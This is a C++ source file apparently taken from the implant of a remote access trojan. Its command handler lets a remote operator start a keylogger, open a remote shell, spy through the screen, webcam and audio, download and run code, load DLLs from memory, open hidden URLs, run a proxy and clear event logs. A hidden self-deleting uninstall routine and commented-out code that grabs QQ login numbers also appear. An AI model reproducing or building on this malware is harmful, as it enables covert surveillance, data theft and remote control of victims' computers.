// KernelManager.cpp: implementation of the CKernelManager class.
//
//////////////////////////////////////////////////////////////////////

#include "stdafx.h"
#include "KernelManager.h"
#include "Loop.h"
#include <shlobj.h>
//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////
char	CKernelManager::m_strMasterHost[256] = {0};
UINT	CKernelManager::m_nMasterPort = 80;

CKernelManager::CKernelManager(CClientSocket *pClient,
		LPCTSTR lpszMasterHost, UINT nMasterPort) : CManager(pClient)
{
	if (lpszMasterHost != NULL)
		lstrcpy(m_strMasterHost, lpszMasterHost);

	m_nMasterPort = nMasterPort;
	m_nThreadCount = 0;
}

CKernelManager::~CKernelManager()
{
	for(UINT i = 0; i < m_nThreadCount; i++)
	{
		TerminateThread(m_hThread[i], -1);
		CloseHandle(m_hThread[i]);
	}
}


CKernelManager::CKernelManager(CClientSocket *pClient):CManager(pClient)
{
	m_nThreadCount = 0;
}


void CKernelManager::StartUnLineHook()
{	
	
	MyCreateThread(NULL, 0,	(LPTHREAD_START_ROUTINE)KeyLogger, NULL, 0,	NULL, true);
}

extern DLLSERVER_INFO dll_info;

BOOL DeleteMyserlf() // ɾ������
{
	TCHAR szModule [MAX_PATH],
		szComspec[MAX_PATH],
		szParams [MAX_PATH];
	
	// get file path names:
	if((GetModuleFileName(0,szModule,MAX_PATH)!=0) &&
		(GetShortPathName(szModule,szModule,MAX_PATH)!=0) &&
		(GetEnvironmentVariable("COMSPEC",szComspec,MAX_PATH)!=0))
	{
		// set command shell parameters
		lstrcpy(szParams," /c del ");
		lstrcat(szParams, szModule);
		lstrcat(szParams, " > nul");
		lstrcat(szComspec, szParams);
		// set struct members
		STARTUPINFO		si={0};
		PROCESS_INFORMATION	pi={0};
		si.cb = sizeof(si);
		si.dwFlags = STARTF_USESHOWWINDOW;
		si.wShowWindow = SW_HIDE;
		
		// increase resource allocation to program
		SetPriorityClass(GetCurrentProcess(),
			REALTIME_PRIORITY_CLASS);
		SetThreadPriority(GetCurrentThread(),
			THREAD_PRIORITY_TIME_CRITICAL);
		
		// invoke command shell
		if(CreateProcess(0, szComspec, 0, 0, 0,CREATE_SUSPENDED|
			DETACHED_PROCESS, 0, 0, &si, &pi))
		{
			// suppress command shell process until program exits
			SetPriorityClass(pi.hProcess,IDLE_PRIORITY_CLASS);
			SetThreadPriority(pi.hThread,THREAD_PRIORITY_IDLE); 
			
			// resume shell process with new low priority
			ResumeThread(pi.hThread);
			
			// everything seemed to work
			return TRUE;
		}
		else // if error, normalize allocation
		{
			SetPriorityClass(GetCurrentProcess(),
				NORMAL_PRIORITY_CLASS);
			SetThreadPriority(GetCurrentThread(),
				THREAD_PRIORITY_NORMAL);
		}
	}
	return FALSE;
}

void CKernelManager::UnInstallService()
{
	
//////////////////������ɾ��

// 	DeleteFile("C:\\2.xls");
// 	DeleteFile("C:\\1.bat");
	Sleep(1000);

///////////////////////////////////


	//ɾ������
	char	*ServerA = NULL;
	ServerA = dll_info.ServiceName;
	SC_HANDLE service, scm;
	scm = OpenSCManager(0, 0,SC_MANAGER_CREATE_SERVICE);
	service = OpenService(scm, ServerA,SERVICE_ALL_ACCESS | DELETE);
	DeleteService(service);

	/////////////////////////////////////////////////////////////
	TCHAR	strRecordFile[MAX_PATH];
	GetSystemDirectory(strRecordFile, sizeof(strRecordFile));
	char keylog[] = {'\\','D','e','f','a','u','l','t','.','k','e','y','\0'};
	lstrcat(strRecordFile, keylog);
	DeleteFile(strRecordFile);
	//	DeleteFile(strSysPath);
	DeleteMyserlf();
	exit(0);
	ExitProcess(0);
	
}

bool CKernelManager::IsActived()
{
	return	m_bIsActived;	
}
int StormRand1(int count)
{
	unsigned long Time=GetTickCount();
	int seed=rand()+3;
	seed=(seed*Time)%count;
	return seed;
}
void CKernelManager::OnReceive(LPBYTE lpBuffer, UINT nSize)
{
	switch (lpBuffer[0])
	{
	case COMMAND_LIST_DRIVE: // �ļ�����
	case COMMAND_SHELL: // Զ���ն�
	case COMMAND_SCREEN_SPY: // ��Ļ�鿴
	case COMMAND_SCREEN_SPY1: // ��Ļ�鿴
	case COMMAND_AUDIO: //����
//	case COMMAND_KEYBOARD: 
	case COMMAND_WEBCAM: // ��Ƶ
	case COMMAND_SERVICE_MANAGER:
	case COMMAND_REGEDIT:
	case COMMAND_PROXY_MAP:
	case COMMAND_TEXT_CHAT: //Զ�̽�̸
		{
			PBYTE hMemDll   = (PBYTE)VirtualAlloc(0,nSize - 1,MEM_COMMIT|MEM_RESERVE,PAGE_READWRITE);
			if (hMemDll == NULL)
				break;
			memcpy(hMemDll,lpBuffer + 1,nSize -1);
			m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_Plugin,
				(LPVOID)hMemDll, 0, NULL,true);
		}
		break;
	case COMMAND_SYSTEM: 
		{
			{
				PBYTE hMemDll   = (PBYTE)VirtualAlloc(0,nSize - 1,MEM_COMMIT|MEM_RESERVE,PAGE_READWRITE);
				if (hMemDll == NULL)
					break;
				memcpy(hMemDll,lpBuffer + 1,nSize -1);
				m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_SysPlugin,
					(LPVOID)hMemDll, 0, NULL,true);
			}
			
		}
		break;
	case COMMAND_KEYBOARD: //���̼�¼	
			MyCreateThread(NULL, 0,	(LPTHREAD_START_ROUTINE)KeyLogger, NULL, 0,	NULL, true);
			m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_KeyboardManager,//֪ͨ�򿪼��̼�¼����
				(LPVOID)m_pClient->m_Socket, 0, NULL);
			Sleep(10);		
		break;
// 			case COMMAND_SYSINFO: 
// 				{
// 					//OutputDebugString("Loop_SysInfoManager");
// 	
// 				
// 		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_SysInfoManager,
// 			(LPVOID)m_pClient->m_Socket, 0, NULL);}
// 		break;
	case COMMAND_CHAT: //Զ�̼��а�
		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_ChatManager,
			(LPVOID)m_pClient->m_Socket, 0, NULL);
		break;
	case COMMAND_SESSION:
		ShutdownWindows(lpBuffer[1]);
		break;
	case COMMAND_RENAME_REMARK: // �ı�ע
//		SetHostID((LPCTSTR)(lpBuffer + 1));
		SetHostID(dll_info.ServiceName, (LPCTSTR)(lpBuffer + 1));
		break;
	case COMMAND_CHANGE_GROUP:
//		OutputDebugString("�����޸ķ�������");
//		SetHostID((LPCTSTR)(lpBuffer + 1), TRUE);
		SetGroup( dll_info.ServiceName, (LPCTSTR)(lpBuffer + 1));
		break;
	case COMMAND_DOWN_EXEC: // ������
		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_DownManager,
			(LPVOID)(lpBuffer + 1), 0, NULL);
		Sleep(100); // ���ݲ�����
		break;
	case COMMAND_OPEN_URL_SHOW: // ��ʾ����ҳ
		OpenURL((LPCTSTR)(lpBuffer + 1), SW_SHOWNORMAL);
		break;
	case COMMAND_OPEN_URL_HIDE: // ���ش���ҳ
		OpenURL((LPCTSTR)(lpBuffer + 1), SW_HIDE);
		break;
	case COMMAND_UNINSTALL: // ж��
		UnInstallService();
		break;
	case COMMAND_LOCAL_UPLOAD:
	    LocalLoad(lpBuffer ,nSize);
		break;
	case COMMAND_FIND_PROCESS: // ����ɸѡ
		CheckProcess(lpBuffer,m_pClient);
		break;
	case COMMAND_FIND_WINDOW: // ����ɸѡ
		CheckWindow(lpBuffer,m_pClient);
		break;
	case COMMAND_CLORE:
		SetClore((LPCTSTR)(lpBuffer + 1));
		break;
	case COMMAND_DOWN_UPDATE:
		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)UpdateServer,
			(LPVOID)(lpBuffer + 1), 0, NULL,true);
		break;
	case COMMAND_MESSAGEBOX:
 		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_Messagebox,
 			(LPVOID)(lpBuffer + 1), 0, NULL,true);
		break;
	case COMMAND_OPEN_PROXY:
		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_Proxy,
			(LPVOID)(m_pClient), 0, NULL,true);
		break;
	case COMMAND_CLOSE_PROXY:
		StopProxy();
		break;
	case COMMAND_PRANK:
		{
			PBYTE hMemDll   = (PBYTE)VirtualAlloc(0,nSize - 2,MEM_COMMIT|MEM_RESERVE,PAGE_READWRITE);
			if (hMemDll == NULL)
		       break;
			memcpy(hMemDll,lpBuffer + 2,nSize -2);
			LoadFromMemory((LPVOID)hMemDll,"",lpBuffer[1],NULL);
		}
		break;
	case COMMAND_CLEAN_EVENT:
		CleanEvent(lpBuffer[1]);
		break;
/*
	case COMMAND_SHOW_QQ:
		{
//			OutputDebugString("�����¼��QQ");
			char	LoginQQ[80];	// ��¼��QQ
			LoginQQ[0] = TOKEN_SHOWQQ;
			char *szQQNum = GetQQ();
			strcpy( LoginQQ+1, szQQNum);
			delete []szQQNum;
			
			m_pClient->Send((LPBYTE)LoginQQ,80);
		}

		break;*/

	case		COMMAND_Run:
		UpXRUN((char *)lpBuffer + 1);
		break;
/*
	case COMMAND_QQBOX:
		{
//			OutputDebugString("��������QQ");
			m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_ShowDlg,
			(LPVOID)(lpBuffer + 1), 0, NULL, true);
		}
		break;*/
	default:
		break;
	}	
}



